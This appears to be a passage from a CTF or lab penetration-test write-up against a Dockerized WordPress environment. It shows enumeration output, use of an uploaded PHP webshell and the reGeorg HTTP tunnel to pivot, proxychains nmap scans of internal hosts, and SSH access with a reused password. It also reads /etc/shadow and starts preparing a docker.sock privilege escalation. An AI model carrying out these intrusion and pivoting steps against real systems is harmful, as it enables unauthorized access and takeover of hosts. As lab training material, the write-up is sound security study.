+-rwxr-xr-x  1 root root  2202 Apr  6  2015 umountnfs.sh
+-rwxr-xr-x  1 root root  1129 Apr  6  2015 umountroot
+-rwxr-xr-x  1 root root  3111 Apr  6  2015 urandom
+
+<SNIP>
+
+-rw-r--r-- 1 root root  395 Apr  8  2017 time-sync.target
+-rw-r--r-- 1 root root  355 Apr  8  2017 timers.target
+-rw-r--r-- 1 root root  661 Apr  8  2017 tmp.mount
+-rw-r--r-- 1 root root  417 Apr  8  2017 umount.target
+-rw-r--r-- 1 root root  392 Apr  8  2017 user.slice
+-rw-r--r-- 1 root root  497 Apr  8  2017 user@.service
+
+/lib/systemd/system/apache2.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 42 Jul 18  2017 forking.conf
+
+/lib/systemd/system/getty.target.wants:
+total 0
+lrwxrwxrwx 1 root root 23 Apr  8  2017 getty-static.service -> ../getty-static.service
+
+/lib/systemd/system/graphical.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Apr  8  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/local-fs.target.wants:
+total 0
+lrwxrwxrwx 1 root root 29 Apr  8  2017 systemd-remount-fs.service -> ../systemd-remount-fs.service
+
+/lib/systemd/system/multi-user.target.wants:
+total 0
+lrwxrwxrwx 1 root root 15 Apr  8  2017 getty.target -> ../getty.target
+lrwxrwxrwx 1 root root 33 Apr  8  2017 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
+lrwxrwxrwx 1 root root 25 Apr  8  2017 systemd-logind.service -> ../systemd-logind.service
+lrwxrwxrwx 1 root root 39 Apr  8  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+lrwxrwxrwx 1 root root 32 Apr  8  2017 systemd-user-sessions.service -> ../systemd-user-sessions.service
+
+/lib/systemd/system/networking.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 84 Apr  8  2017 network-pre.conf
+
+/lib/systemd/system/poweroff.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Apr  8  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/reboot.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Apr  8  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/rescue.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Apr  8  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/runlevel1.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Apr  8  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+<SNIP>
+
+### SOFTWARE #############################################
+[-] Apache version:
+Server version: Apache/2.4.10 (Debian)
+Server built:   Jul 18 2017 18:32:16
+
+
+[-] Apache user configuration:
+: ${APACHE_RUN_USER:=www-data}
+APACHE_RUN_USER
+: ${APACHE_RUN_GROUP:=www-data}
+APACHE_RUN_GROUP
+
+
+[-] Installed Apache modules:
+Loaded Modules:
+ core_module (static)
+ so_module (static)
+ watchdog_module (static)
+ http_module (static)
+ log_config_module (static)
+ logio_module (static)
+ version_module (static)
+ unixd_module (static)
+ access_compat_module (shared)
+ alias_module (shared)
+ auth_basic_module (shared)
+ authn_core_module (shared)
+ authn_file_module (shared)
+ authz_core_module (shared)
+ authz_host_module (shared)
+ authz_user_module (shared)
+ autoindex_module (shared)
+ deflate_module (shared)
+ dir_module (shared)
+ env_module (shared)
+ expires_module (shared)
+ filter_module (shared)
+ mime_module (shared)
+ mpm_prefork_module (shared)
+ negotiation_module (shared)
+ php5_module (shared)
+ reqtimeout_module (shared)
+ rewrite_module (shared)
+ setenvif_module (shared)
+ status_module (shared)
+
+
+[-] www home dir contents:
+/var/www/:
+total 12K
+drwxr-xr-x  4 root     root     4.0K Jul 24  2017 .
+drwxr-xr-x 33 root     root     4.0K Aug  4  2017 ..
+drwxr-xr-x  5 www-data www-data 4.0K Mar 16 23:03 html
+
+/var/www/html:
+total 204K
+drwxr-xr-x  5 www-data www-data 4.0K Mar 16 23:03 .
+drwxr-xr-x  4 root     root     4.0K Jul 24  2017 ..
+-rw-r--r--  1 www-data www-data  235 Aug 19  2017 .htaccess
+-rw-r--r--  1 www-data www-data  418 Sep 25  2013 index.php
+-rw-r--r--  1 www-data www-data  20K Mar 16 23:03 license.txt
+-rw-r--r--  1 www-data www-data 7.3K Mar 16 23:03 readme.html
+-rw-r--r--  1 www-data www-data 6.8K Mar 16 23:03 wp-activate.php
+drwxr-xr-x  9 www-data www-data 4.0K Aug  2  2017 wp-admin
+-rw-r--r--  1 www-data www-data  364 Dec 19  2015 wp-blog-header.php
+-rw-r--r--  1 www-data www-data 1.6K Aug 29  2016 wp-comments-post.php
+-rw-r--r--  1 www-data www-data 2.7K Mar 16 22:31 wp-config-sample.php
+-rw-r--r--  1 root     root     3.3K Mar 16 22:31 wp-config.php
+drwxr-xr-x  6 www-data www-data 4.0K Mar 16 23:52 wp-content
+-rw-r--r--  1 www-data www-data 3.3K May 24  2015 wp-cron.php
+drwxr-xr-x 18 www-data www-data  12K Aug  2  2017 wp-includes
+-rw-r--r--  1 www-data www-data 2.4K Nov 21  2016 wp-links-opml.php
+-rw-r--r--  1 www-data www-data 3.3K Oct 25  2016 wp-load.php
+-rw-r--r--  1 www-data www-data  34K Mar 16 23:03 wp-login.php
+-rw-r--r--  1 www-data www-data 7.9K Jan 11  2017 wp-mail.php
+-rw-r--r--  1 www-data www-data  16K Apr  6  2017 wp-settings.php
+-rw-r--r--  1 www-data www-data  30K Jan 24  2017 wp-signup.php
+-rw-r--r--  1 www-data www-data 4.5K Oct 14  2016 wp-trackback.php
+-rw-r--r--  1 www-data www-data 3.0K Aug 31  2016 xmlrpc.php
+
+/var/www/html/wp-admin:
+total 940K
+drwxr-xr-x 9 www-data www-data 4.0K Aug  2  2017 .
+drwxr-xr-x 5 www-data www-data 4.0K Mar 16 23:03 ..
+-rw-r--r-- 1 www-data www-data  19K Mar 16 23:03 about.php
+-rw-r--r-- 1 www-data www-data 3.8K May 10  2017 admin-ajax.php
+-rw-r--r-- 1 www-data www-data 2.6K Jan  9  2017 admin-footer.php
+-rw-r--r-- 1 www-data www-data  405 Jul  6  2016 admin-functions.php
+-rw-r--r-- 1 www-data www-data 7.2K Nov 21  2016 admin-header.php
+-rw-r--r-- 1 www-data www-data 1.7K Feb 25  2016 admin-post.php
+-rw-r--r-- 1 www-data www-data  11K Jan 22  2017 admin.php
+-rw-r--r-- 1 www-data www-data 4.2K Mar 16 23:03 async-upload.php
+-rw-r--r-- 1 www-data www-data  11K Oct  4  2016 comment.php
+-rw-r--r-- 1 www-data www-data 4.7K Jun  1  2017 credits.php
+drwxr-xr-x 3 www-data www-data 4.0K Aug  2  2017 css
+-rw-r--r-- 1 www-data www-data  20K Oct 26  2016 custom-background.php
+-rw-r--r-- 1 www-data www-data  45K May 19  2017 custom-header.php
+-rw-r--r-- 1 www-data www-data 7.3K May 16  2017 customize.php
+-rw-r--r-- 1 www-data www-data  14K Dec 14  2016 edit-comments.php
+-rw-r--r-- 1 www-data www-data  32K May  7  2017 edit-form-advanced.php
+-rw-r--r-- 1 www-data www-data 7.2K Sep 17  2016 edit-form-comment.php
+-rw-r--r-- 1 www-data www-data 5.9K Dec  7  2016 edit-link-form.php
+-rw-r--r-- 1 www-data www-data 9.2K Mar 16 23:03 edit-tag-form.php
+-rw-r--r-- 1 www-data www-data  20K May 12  2017 edit-tags.php
+-rw-r--r-- 1 www-data www-data  16K Jan 21  2017 edit.php
+-rw-r--r-- 1 www-data www-data  11K Oct  4  2016 export.php
+-rw-r--r-- 1 www-data www-data 3.4K Jun  1  2017 freedoms.php
+drwxr-xr-x 2 www-data www-data 4.0K Aug  2  2017 images
+-rw-r--r-- 1 www-data www-data 7.1K Oct  4  2016 import.php
+drwxr-xr-x 2 www-data www-data 4.0K Aug  2  2017 includes
+-rw-r--r-- 1 www-data www-data 6.1K May 18  2017 index.php
+-rw-r--r-- 1 www-data www-data 5.7K Oct 14  2015 install-helper.php
+-rw-r--r-- 1 www-data www-data  16K Mar 16 23:03 install.php
+drwxr-xr-x 3 www-data www-data 4.0K Aug  2  2017 js
+-rw-r--r-- 1 www-data www-data  700 Jun 29  2016 link-add.php
+-rw-r--r-- 1 www-data www-data 3.9K Dec  7  2016 link-manager.php
+-rw-r--r-- 1 www-data www-data 2.4K Oct 24  2016 link-parse-opml.php
+-rw-r--r-- 1 www-data www-data 2.6K Jul 10  2016 link.php
+-rw-r--r-- 1 www-data www-data 2.2K Aug 31  2016 load-scripts.php
+-rw-r--r-- 1 www-data www-data 2.9K Aug 31  2016 load-styles.php
+drwxr-xr-x 2 www-data www-data 4.0K Aug  2  2017 maint
+-rw-r--r-- 1 www-data www-data 3.1K Oct  4  2016 media-new.php
+-rw-r--r-- 1 www-data www-data 3.3K Aug 22  2016 media-upload.php
+-rw-r--r-- 1 www-data www-data 5.2K Dec  7  2016 media.php
+-rw-r--r-- 1 www-data www-data 9.1K Nov  4  2016 menu-header.php
+-rw-r--r-- 1 www-data www-data  13K Apr  7  2017 menu.php
+-rw-r--r-- 1 www-data www-data  320 Sep 25  2013 moderation.php
+-rw-r--r-- 1 www-data www-data  211 Sep 25  2013 ms-admin.php
+-rw-r--r-- 1 www-data www-data 3.9K Oct 26  2016 ms-delete-site.php
+
+<SNIP>
+
+### INTERESTING FILES ####################################
+[-] Useful file locations:
+/usr/bin/gcc
+/usr/bin/curl
+
+
+[-] Installed compilers:
+ii  g++                           4:4.9.2-2      amd64        GNU C++ compiler
+ii  g++-4.9                       4.9.2-10       amd64        GNU C++ compiler
+ii  gcc                           4:4.9.2-2      amd64        GNU C compiler
+ii  gcc-4.9                       4.9.2-10       amd64        GNU C compiler
+
+
+[-] Can we read/write sensitive files:
+-rw-r--r-- 1 root root 1197 Jul 23  2017 /etc/passwd
+-rw-r--r-- 1 root root 577 Jul 23  2017 /etc/group
+-rw-r--r-- 1 root root 761 Oct 22  2014 /etc/profile
+-rw-r----- 1 root shadow 626 Jul 23  2017 /etc/shadow
+
+
+[-] SUID files:
+-rwsr-xr-x 1 root root 44464 May 17  2017 /usr/bin/chsh
+-rwsr-xr-x 1 root root 54192 May 17  2017 /usr/bin/passwd
+-rwsr-xr-x 1 root root 75376 May 17  2017 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 39912 May 17  2017 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 53616 May 17  2017 /usr/bin/chfn
+-rwsr-xr-x 1 root root 27416 Mar 29  2015 /bin/umount
+-rwsr-xr-x 1 root root 40000 Mar 29  2015 /bin/mount
+-rwsr-xr-x 1 root root 70576 Oct 28  2014 /bin/ping
+-rwsr-xr-x 1 root root 61392 Oct 28  2014 /bin/ping6
+-rwsr-xr-x 1 root root 40168 May 17  2017 /bin/su
+
+
+[-] SGID files:
+-rwxr-sr-x 1 root shadow 22744 May 17  2017 /usr/bin/expiry
+-rwxr-sr-x 1 root tty 27232 Mar 29  2015 /usr/bin/wall
+-rwxr-sr-x 1 root shadow 62272 May 17  2017 /usr/bin/chage
+-rwxr-sr-x 1 root shadow 35408 May 27  2017 /sbin/unix_chkpwd
+
+
+[-] NFS displaying partitions and filesystems - you need to check if exotic filesystems
+# UNCONFIGURED FSTAB FOR BASE SYSTEM
+
+[-] Can't search *.conf files as no keyword was entered
+[-] Can't search *.php files as no keyword was entered
+[-] Can't search *.log files as no keyword was entered
+[-] Can't search *.ini files as no keyword was entered
+
+[-] All *.conf files in /etc (recursive 1 level):
+-rw-r--r-- 1 root root 38 Mar 16 22:31 /etc/resolv.conf
+-rw-r--r-- 1 root root 7727 Jul 24  2017 /etc/ca-certificates.conf
+-rw-r--r-- 1 root root 2981 Jul 23  2017 /etc/adduser.conf
+-rw-r--r-- 1 root root 956 Dec 27  2016 /etc/mke2fs.conf
+-rw-r--r-- 1 root root 2969 Jun 17  2017 /etc/debconf.conf
+-rw-r--r-- 1 root root 859 Nov 23  2012 /etc/insserv.conf
+-rw-r--r-- 1 root root 552 Nov 12  2016 /etc/pam.conf
+-rw-r--r-- 1 root root 9 Aug  7  2006 /etc/host.conf
+-rw-r--r-- 1 root root 34 Apr  9  2017 /etc/ld.so.conf
+-rw-r--r-- 1 root root 191 Sep  7  2014 /etc/libaudit.conf
+-rw-r--r-- 1 root root 2584 Feb  7  2014 /etc/gai.conf
+-rw-r--r-- 1 root root 604 May 15  2012 /etc/deluser.conf
+-rw-r--r-- 1 root root 497 May  4  2014 /etc/nsswitch.conf
+-rw-r--r-- 1 root root 2084 Mar  6  2015 /etc/sysctl.conf
+
+
+[-] Any interesting mail in /var/mail:
+total 8
+drwxrwsr-x  2 root mail 4096 Jul 23  2017 .
+drwxr-xr-x 33 root root 4096 Aug  4  2017 ..
+
+
+[+] Looks like we're in a Docker container:
+11:name=systemd:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
+10:hugetlb:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
+9:perf_event:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
+8:blkio:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
+7:freezer:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
+6:devices:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
+5:memory:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
+4:cpuacct:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
+3:cpu:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
+2:cpuset:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
+-rwxr-xr-x 1 root root 0 Aug 22  2017 /.dockerenv
+
+
+### SCAN COMPLETE ####################################
+
+
+
+Note: The page 'wp-admin/admin-ajax.php' is reachable 
+
+
+=> Pivoting techniques using the 'ReGerog' Webshell (it tunnels TCP communication over HTTP)
+============================================================================================
+
+
+Using my PHP webshell uploaded via the Wordpress site "http://192.168.1.39:8000/wp-content/uploads/2020/03/webshell.php"
+
+
+$ ip address
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+7: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:ac:12:00:03 brd ff:ff:ff:ff:ff:ff
+    inet 172.18.0.3/16 scope global eth0
+       valid_lft forever preferred_lft forever
+
+
+
+root@Security-Audit-01:~/Desktop/CTFs/Docker# wget https://codeload.github.com/sensepost/reGeorg/zip/master
+--2020-03-17 19:37:36--  https://codeload.github.com/sensepost/reGeorg/zip/master
+Resolving codeload.github.com (codeload.github.com)... 140.82.114.9
+Connecting to codeload.github.com (codeload.github.com)|140.82.114.9|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [application/zip]
+Saving to: ‘master.1’
+
+master.1                   [ <=>                         ]  16.73K  --.-KB/s    in 0.09s   
+
+2020-03-17 19:37:37 (194 KB/s) - ‘master.1’ saved [17136]
+
+
+
+root@Security-Audit-01:~/Desktop/CTFs/Docker# unzip master.1
+Archive:  master.1
+1ca54c2a6ab22ded150d04cff8fdb796990b1ced
+   creating: reGeorg-master/
+  inflating: reGeorg-master/LICENSE.html  
+  inflating: reGeorg-master/LICENSE.txt  
+  inflating: reGeorg-master/README.md  
+  inflating: reGeorg-master/reGeorgSocksProxy.py  
+  inflating: reGeorg-master/tunnel.ashx  
+  inflating: reGeorg-master/tunnel.aspx  
+  inflating: reGeorg-master/tunnel.js  
+  inflating: reGeorg-master/tunnel.jsp  
+  inflating: reGeorg-master/tunnel.nosocket.php  
+  inflating: reGeorg-master/tunnel.php  
+  inflating: reGeorg-master/tunnel.tomcat.5.jsp  
+
+
+root@Security-Audit-01:~/Desktop/CTFs/Docker# ls -al
+total 10336
+drwxr-xr-x  4 root root     4096 Mar 17 19:46 .
+drwxr-xr-x 20 root root     4096 Mar 16 23:34 ..
+-rw-r--r--  1 root root 10479112 Mar 17 19:02 master
+-rw-r--r--  1 root root    17136 Mar 17 19:37 master.1
+-rwxr-xr-x  1 root root     6188 Mar 17 19:00 proxy.py
+-rw-r--r--  1 root root      133 Mar 17 00:48 QwertyRocks.php
+drwxr-xr-x  2 root root     4096 Feb 16  2017 reGeorg-master
+drwxr-xr-x  5 root root     4096 Mar 17 19:07 Tunna-master
+-rwxr-xr-x  1 root root    12662 Mar 17 18:57 webserver.py
+-rw-r--r--  1 root root    12662 Mar 17 18:59 webserver.py.1
+-rw-r--r--  1 root root        6 Mar 17 00:49 wetw0rk_maybe.php
+-rwxr-xr-x  1 root root     3752 Mar 17 00:46 wordpwn.py
+
+
+=> Upload of the file "tunnel.nosocket.php" in "/wp-content/uploads/2020/03/"
+
+
+=> Then execution of the ReGeorg Web tunnel proxy
+
+root@Security-Audit-01:~/Desktop/CTFs/Docker/reGeorg-master# python2 reGeorgSocksProxy.py -p 8080 -u http://192.168.1.39:8000/wp-content/uploads/2020/03/tunnel.nosocket.php 
+
+                     _____
+  _____   ______  __|___  |__  ______  _____  _____   ______
+ |     | |   ___||   ___|    ||   ___|/     \|     | |   ___|
+ |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  |
+ |__|\__\|______||______|  __||______|\_____/|__|\__\|______|
+                    |_____|
+                    ... every office needs a tool like Georg
+
+  willem@sensepost.com / @_w_m__
+  sam@sensepost.com / @trowalts
+  etienne@sensepost.com / @kamp_staaldraad
+  
+   
+[INFO   ]  Log Level set to [INFO]
+[INFO   ]  Starting socks server [127.0.0.1:8080], tunnel at [http://192.168.1.39:8000/wp-content/uploads/2020/03/tunnel.nosocket.php]
+[INFO   ]  Checking if Georg is ready
+[INFO   ]  Georg says, 'All seems fine'
+[INFO   ]  [4.2.2.2:53] HTTP [200]: cookie [PHPSESSID=77aee59a92ad1b9f497ca94a927ca70e; path[INFO   ]  [4.2.2.2:53] <<<< [33]
+[INFO   ]  [4.2.2.2:53] Connection Terminated
+[ERROR  ]  [4.2.2.2:53] HTTP [200]: Status: [FAIL]: Message [RemoteSocket read filed] Shutting down
+[INFO   ]  [4.2.2.2:53] Connection Terminated
+[ERROR  ]  Failed connecting to target
+[ERROR  ]  [4.2.2.2:53] Remote failed
+[INFO   ]  [4.2.2.2:53] Connection Terminated
+[INFO   ]  [172.18.0.4:22] HTTP [200]: cookie [PHPSESSID=97459d5fc0740dc1bba634c2415f97af; p[INFO   ]  [172.18.0.4:22] >>>> [48]
+
+
+
+echo "socks5 127.0.0.1 8080" >>/etc/proxychains.conf
+
+
+
+We can now use NMAP with proxychains (important to add the the -n option with proxychains)
+-------------------------------------------------------------------------------------------
+
+root@Security-Audit-01:~/Desktop/CTFs/Docker# proxychains nmap -Pn -v -sT -n -p 1-65535 172.18.0.1
+Completed Connect Scan at 23:21, 6.00s elapsed (1000 total ports)
+Nmap scan report for 172.18.0.1
+Host is up (0.0058s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8000/tcp open  http-alt
+
+
+root@Security-Audit-01:~/Desktop/CTFs/Docker# proxychains nmap -Pn -v -sT -n -p 1-65535 172.18.0.2
+Completed Connect Scan at 23:22, 6.03s elapsed (1000 total ports)
+Nmap scan report for 172.18.0.2
+Host is up (0.0061s latency).
+Not shown: 999 closed ports
+PORT     STATE SERVICE
+3306/tcp open  mysql
+
+root@Security-Audit-01:~/Desktop/CTFs/Docker# proxychains nmap -Pn -v -sT -n -p 1-65535 172.18.0.3
+Completed Connect Scan at 23:22, 5.96s elapsed (1000 total ports)
+Nmap scan report for 172.18.0.3
+Host is up (0.0055s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+
+root@Security-Audit-01:~/Desktop/CTFs/Docker# proxychains nmap -Pn -v -sT -n -p 1-65535 172.18.0.4
+Completed Connect Scan at 23:23, 6.03s elapsed (1000 total ports)
+Nmap scan report for 172.18.0.4
+Host is up (0.0068s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8022/tcp open  oa-system
+
+
+I identified the Db version and tried to log into the MySQL database...
+-----------------------------------------------------------------------
+
+root@Security-Audit-01:~/Desktop/CTFs/Docker# proxychains netcat 172.18.0.2 3306
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-127.0.0.1:8080-<><>-172.18.0.2:3306-<><>-OK
+
+5.7.19  niy?p???SeKn{&k8}Q4  mysql_native_password:
+
+
+root@Security-Audit-01:~/Desktop/CTFs/Docker# proxychains mysql -h 172.18.0.2 -u wordpress -p wordpress
+ProxyChains-3.1 (http://proxychains.sf.net)
+Enter password: 
+|S-chain|-<>-127.0.0.1:8080-<><>-172.18.0.3:3306-<--timeout
+ERROR 2002 (HY000): Can't connect to MySQL server on '172.18.0.2' (111)
+
+
+I try to log into '172.18.0.1' but I don't have the root's password (I tried the same password than bob i.e. Welcome1)
+----------------------------------------------------------------------------------------------------------------------
+
+root@Security-Audit-01:~/Desktop/CTFs/Docker# proxychains ssh 172.18.0.1
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-127.0.0.1:8080-<><>-172.18.0.1:22-<><>-OK
+The authenticity of host '172.18.0.1 (172.18.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:iMM5I1uQqleM9fe/JBCQcZp73GOjgDxxR/EB4Gwf1QI.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '172.18.0.1' (ECDSA) to the list of known hosts.
+root@172.18.0.1's password: 
+
+
+Then I tried to log into '172.18.0.4' (using bob:Welcome1) and I was automatically logged as 'root'
+---------------------------------------------------------------------------------------------------
+
+root@Security-Audit-01:~/Desktop/CTFs/Docker# proxychains ssh 172.18.0.4
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-127.0.0.1:8080-<><>-172.18.0.4:22-<><>-OK
+The authenticity of host '172.18.0.4 (172.18.0.4)' can't be established.
+RSA key fingerprint is SHA256:ZDiL5/w1PFnaWvEKWM6N7Jzsz/FqPMM1SpLbbDUUtSQ.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '172.18.0.4' (RSA) to the list of known hosts.
+
+ ###############################################################
+ ## Docker SSH ~ Because every container should be accessible ##
+ ###############################################################
+ ## container | content_db_1                                  ##
+ ###############################################################
+
+
+/ $ id
+uid=0(root) gid=0(root) groups=0(root)
+
+/ $ cat /etc/shadow
+root:*:17370:0:99999:7:::
+daemon:*:17370:0:99999:7:::
+bin:*:17370:0:99999:7:::
+sys:*:17370:0:99999:7:::
+sync:*:17370:0:99999:7:::
+games:*:17370:0:99999:7:::
+man:*:17370:0:99999:7:::
+lp:*:17370:0:99999:7:::
+mail:*:17370:0:99999:7:::
+news:*:17370:0:99999:7:::
+uucp:*:17370:0:99999:7:::
+proxy:*:17370:0:99999:7:::
+www-data:*:17370:0:99999:7:::
+backup:*:17370:0:99999:7:::
+list:*:17370:0:99999:7:::
+irc:*:17370:0:99999:7:::
+gnats:*:17370:0:99999:7:::
+nobody:*:17370:0:99999:7:::
+systemd-timesync:*:17370:0:99999:7:::
+systemd-network:*:17370:0:99999:7:::
+systemd-resolve:*:17370:0:99999:7:::
+systemd-bus-proxy:*:17370:0:99999:7:::
+mysql:!:17373::::::
+
+/ $ 
+
+$ ls -al
+total 76
+drwxr-xr-x  53 root root 4096 Aug 22  2017 .
+drwxr-xr-x  53 root root 4096 Aug 22  2017 ..
+-rwxr-xr-x   1 root root    0 Aug 22  2017 .dockerenv
+drwxr-xr-x   2 root root 4096 Jul 26  2017 bin
+drwxr-xr-x   2 root root 4096 Jul 13  2017 boot
+drwxr-xr-x   5 root root  340 Mar 17 17:07 dev
+drwxr-xr-x   2 root root 4096 Jul 26  2017 docker-entrypoint-initdb.d
+lrwxrwxrwx   1 root root   34 Jul 26  2017 entrypoint.sh -> usr/local/bin/docker-entrypoint.sh
+drwxr-xr-x  59 root root 4096 Aug 22  2017 etc
+drwxr-xr-x   2 root root 4096 Jul 13  2017 home
+drwxr-xr-x  11 root root 4096 Jul 26  2017 lib
+drwxr-xr-x   2 root root 4096 Jul 23  2017 lib64
+drwxr-xr-x   2 root root 4096 Jul 23  2017 media
+drwxr-xr-x   2 root root 4096 Jul 23  2017 mnt
+drwxr-xr-x   2 root root 4096 Jul 23  2017 opt
+dr-xr-xr-x 102 root root    0 Mar 17 17:07 proc
+drwx------   2 root root 4096 Aug 22  2017 root
+drwxr-xr-x   5 root root 4096 Aug 22  2017 run
+drwxr-xr-x   2 root root 4096 Jul 23  2017 sbin
+drwxr-xr-x   2 root root 4096 Jul 23  2017 srv
+dr-xr-xr-x  13 root root    0 Mar 17 17:07 sys
+drwxrwxrwt   2 root root 4096 Mar 17 17:07 tmp
+drwxr-xr-x  23 root root 4096 Jul 26  2017 usr
+drwxr-xr-x  21 root root 4096 Jul 26  2017 var
+
+$ cd /root
+~ $ ls -al
+total 20
+drwx------  2 root root 4096 Aug 22  2017 .
+drwxr-xr-x 53 root root 4096 Aug 22  2017 ..
+-rw-------  1 root root  146 Mar 17 20:42 .bash_history
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+-rw-r--r--  1 root root  140 Nov 19  2007 .profile
+
+~ $ cd /home
+/home $ ls
+/home $ ls -al
+total 8
+drwxr-xr-x  2 root root 4096 Jul 13  2017 .
+drwxr-xr-x 53 root root 4096 Aug 22  2017 ..
+
+/home $ ip address
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+5: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff
+    inet 172.18.0.2/16 scope global eth0
+       valid_lft forever preferred_lft forever
+
+/home $ cd /
+
+/ $ hostname
+13f0a3bb2706
+
+/ $ ls -al /var/run/docker.sock
+srw-rw---- 1 root mysql 0 Mar 17 17:07 /var/run/docker.sock
+/ $ 
+
+/ $ uname -a
+Linux 13f0a3bb2706 3.13.0-128-generic #177-Ubuntu SMP Tue Aug 8 11:40:23 UTC 2017 x86_64 GNU/Linux
+
+
+Check if we have access to '/var/run/docker.sock'
+-------------------------------------------------
+/ $ ls -al /var/run/docker.sock
+srw-rw---- 1 root mysql 0 Mar 17 17:07 /var/run/docker.sock
+
+
+=> We can perform a privilege escalation to become ROOT !!!
+Indeed, the Ddcker socket /var/run/docker.sock is the UNIX socket that Docker is listening to and it is the primary entry point for the Docker API. T
+Here the owner of this socket is root. Having access to it is equivalent to have an unrestricted root access to the Linux host server.
+
+In order to exploit this vulnerability we need to install the docker client within our docker containers..
+
+
+=========================================================================================================
+Download the Docker Community package on Kali and then copy it on the unprotected container 'Docker SSH'
+=========================================================================================================
+jeff@kali-Linux:~/Documents/CTFs/Docker/docker_deb$ sudo apt update
+
+jeff@kali-Linux:~/Documents/CTFs/Docker/docker_deb$ sudo apt -y install curl gnupg2 apt-transport-https software-properties-common ca-certificates 
+
+jeff@kali-Linux:~/Documents/CTFs/Docker/docker_deb$ curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
+
+jeff@kali-Linux:~/Documents/CTFs/Docker/docker_deb$ echo "deb [arch=amd64] https://download.docker.com/linux/debian buster stable" | sudo tee  /etc/apt/sources.list.d/docker.list
+deb [arch=amd64] https://download.docker.com/linux/debian buster stable
+
+jeff@kali-Linux:~/Documents/CTFs/Docker/docker_deb$ sudo apt update
+
+jeff@kali-Linux:~/Documents/CTFs/Docker/docker_deb$ sudo su
+
+root@kali-Linux:/home/jeff/Documents/CTFs/Docker/docker_deb# apt download docker-ce
+
+root@kali-Linux:/home/jeff/Documents/CTFs/Docker/docker_deb# apt depends -i docker-ce | awk '{print $2}' | xargs apt download
+
+root@kali-Linux:/home/jeff/Documents/CTFs/Docker/docker_deb# tar cvzf ../docker.tar.gz .
+
+root@kali-Linux:/home/jeff/Documents/CTFs/Docker/docker_deb# exit
+
+jeff@kali-Linux:~/Documents/CTFs/Docker/docker_deb$ ls -al
+total 87248
+drwxr-xr-x 2 jeff jeff     4096 Apr  8 01:30 .
+drwxr-xr-x 3 jeff jeff     4096 Apr  8 01:31 ..
+-rw-r--r-- 1 root root 20114318 Mar  3 05:24 containerd.io_1.2.13-1_amd64.deb
+-rw-r--r-- 1 root root 22863938 Mar 11 20:47 docker-ce_5%3a19.03.8~3-0~debian-buster_amd64.deb
+-rw-r--r-- 1 root root 42566906 Mar 11 20:47 docker-ce-cli_5%3a19.03.8~3-0~debian-buster_amd64.deb
+-rw-r--r-- 1 root root   415480 Feb 13 15:25 iptables_1.8.4-3_amd64.deb
+-rw-r--r-- 1 root root  2821120 Mar 13 01:43 libc6_2.30-2_amd64.deb
+-rw-r--r-- 1 root root   141864 Mar  3 13:29 libdevmapper1.02.1_2%3a1.02.167-1+b1_amd64.deb
+-rw-r--r-- 1 root root    45868 Mar 13 00:27 libseccomp2_2.4.3-1_amd64.deb
